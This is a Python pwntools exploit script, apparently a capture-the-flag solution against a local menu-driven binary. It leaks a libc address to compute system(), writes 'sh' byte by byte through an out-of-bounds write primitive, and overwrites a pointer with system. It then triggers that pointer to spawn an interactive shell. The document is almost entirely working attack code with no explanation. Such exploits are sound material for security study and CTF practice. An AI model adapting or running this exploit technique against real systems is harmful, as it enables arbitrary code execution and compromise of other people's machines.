from pwn import *

HOST = 'localhost'
PORT = 20011
REMOTE = False
context.arch = "amd64"
#context.log_level = 'debug'
elf = ELF('./main')

if REMOTE:
    io = remote(HOST, PORT)
else: 
    io = remote(HOST, PORT)

def create_user(length, name):
    io.sendlineafter('> ', '1')
    io.sendlineafter('> ', str(length))
    io.sendafter('> ', name)

def select_user(idx):
    io.sendlineafter('> ', '2')
    io.sendlineafter('> ', str(idx))

def buy(sel):
    io.sendlineafter('> ', '1')
    io.sendlineafter('> ', str(sel))

def ROL(data, shift, size=64):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)

create_user(200000, 'a')
select_user(0)
for _ in range(9):
    buy(5)
buy(6)
io.sendlineafter('> ', '3')
io.recvuntil('10. flag(')
t = io.recvuntil('$)')[:-2]
read_libc = int(t)

libc_base = read_libc - 0x1147d0
system = libc_base + 0x50d70
io.success(f'libc_base @ {hex(libc_base)}')

sh = b'sh\x00'

io.sendlineafter('> ', '4')
io.sendlineafter('> ', '3')
io.sendlineafter('> ', '0')

for i, c in enumerate(sh):
    io.sendlineafter('offset >', str(i))
    io.sendlineafter('byte >', str(c))
    sleep(0.1)

io.success('Done setting sh')
pause()
for i, c in enumerate(p64(system)):
    io.sendlineafter('offset >', str(i + 0x24e088))
    io.sendlineafter('byte >', str(c))
    sleep(0.1)

io.sendlineafter('offset > ', str(18446744073709551615))

io.interactive()
